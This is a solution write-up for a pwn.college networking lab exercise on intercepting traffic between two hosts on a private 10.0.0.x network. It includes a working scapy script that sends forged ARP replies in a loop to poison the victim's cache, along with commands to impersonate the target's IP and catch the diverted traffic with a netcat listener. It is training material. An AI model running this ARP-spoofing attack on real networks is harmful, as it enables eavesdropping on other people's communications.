---
tags: ["Computer Networking"]
title: "Intercept"
description: Intercept
reference: https://pwn.college/intro-to-cybersecurity/intercepting-communication/
---

# Problem

Intercept traffic from a remote host. The remote host at 10.0.0.2 is communicating with the remote host at 10.0.0.3 on port 31337.

# Solution

1. Get your host mac address

```bash
root@ip-10-0-0-1:~# ip link
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
3: eth0@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP mode DEFAULT group default qlen 1000
    link/ether ea:bb:1a:22:4a:a9 brd ff:ff:ff:ff:ff:ff link-netnsid 0
```

2. Get victim 10.0.0.2 mac address

```bash
root@ip-10-0-0-1:~# arping 10.0.0.2
ARPING 10.0.0.2
42 bytes from fa:1a:c5:ac:e6:cd (10.0.0.2): index=0 time=8.429 usec
42 bytes from fa:1a:c5:ac:e6:cd (10.0.0.2): index=1 time=9.269 usec
```

3. Add 10.0.0.3 to your ether device

```
root@ip-10-0-0-1:~# ip addr add 10.0.0.3/24 dev eth0
```

4. ARP Spoofing that you are 10.0.0.3

```python
root@ip-10-0-0-1:~#  cat -n arpspoof.py
     1	from scapy.all import ARP, sendp, Ether
     2	import time
     3	
     4	target_ip = "10.0.0.2"          # Victim IP
     5	spoof_ip = "10.0.0.3"           # IP you're pretending to be
     6	your_mac = "ea:bb:1a:22:4a:a9"  # Your machine’s MAC (optionally spoofed)
     7	target_mac = "fa:1a:c5:ac:e6:cd"
     8	
     9	packet = Ether(dst=target_mac , src=your_mac) / ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwsrc=your_mac, hwdst=target_mac)
    10	
    11	while True:
    12	    sendp(packet, verbose=False)
    13	    time.sleep(2)
```

5. run TCP server that listen on 10.0.0.3:31337

```bash
root@ip-10-0-0-1:~# nc -l 10.0.0.3 31337
```
